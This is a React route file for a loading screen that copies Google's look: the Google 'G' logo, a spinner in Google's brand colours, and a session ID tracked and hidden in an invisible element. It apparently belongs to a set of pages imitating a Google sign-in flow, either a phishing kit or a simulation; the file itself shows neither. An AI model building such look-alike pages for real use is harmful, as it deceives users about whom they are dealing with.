import { createFileRoute } from "@tanstack/react-router";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/loading")({
  head: () => ({
    meta: [
      { title: "Loading…" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeLoadingPage,
});

const GE_LOADING_CSS = `
${GE_SHELL_CSS}

.ge-loading-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 28px;
  width: 100%;
  min-height: 0;
}
.ge-progress {
  position: absolute;
  left: 24px;
  right: 24px;
  top: 0;
  height: 4px;
  overflow: hidden;
}
@media (min-width: 900px) {
  .ge-progress { left: 36px; right: 36px; }
}
.ge-progress-bar {
  height: 100%;
  width: 40%;
  background: var(--gm-next-fill);
  border-radius: 0 2px 2px 0;
  animation: ge-indeterminate 1.5s infinite linear;
}
@keyframes ge-indeterminate {
  0% { transform: translateX(-100%); }
  100% { transform: translateX(350%); }
}
.ge-spinner {
  width: 48px;
  height: 48px;
}
.ge-spinner svg {
  width: 48px;
  height: 48px;
  animation: ge-rotate 1.4s linear infinite;
  transform-origin: center;
}
.ge-spinner circle {
  fill: none;
  stroke-width: 4;
  stroke-linecap: round;
  stroke-dasharray: 80, 200;
  animation: ge-dash 1.4s ease-in-out infinite, ge-colors 5.6s ease-in-out infinite;
}
@keyframes ge-rotate { 100% { transform: rotate(360deg); } }
@keyframes ge-dash {
  0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
  50% { stroke-dasharray: 90, 200; stroke-dashoffset: -35; }
  100% { stroke-dasharray: 90, 200; stroke-dashoffset: -124; }
}
@keyframes ge-colors {
  0%, 100% { stroke: #4285F4; }
  25% { stroke: #EA4335; }
  50% { stroke: #FBBC05; }
  75% { stroke: #34A853; }
}
`;

function GeLoadingPage() {
  const { sessionId } = useGeTracking();
  return (
    <div className="ge-shell">
      <GeFontStyle />
      <style>{GE_LOADING_CSS}</style>

      <main className="ge-card is-enter" role="main">
        <div className="ge-progress" aria-hidden="true">
          <div className="ge-progress-bar" />
        </div>
        <div className="ge-loading-body">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <div className="ge-spinner" role="progressbar" aria-label="Loading">
            <svg viewBox="0 0 50 50">
              <circle cx="25" cy="25" r="20" />
            </svg>
          </div>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
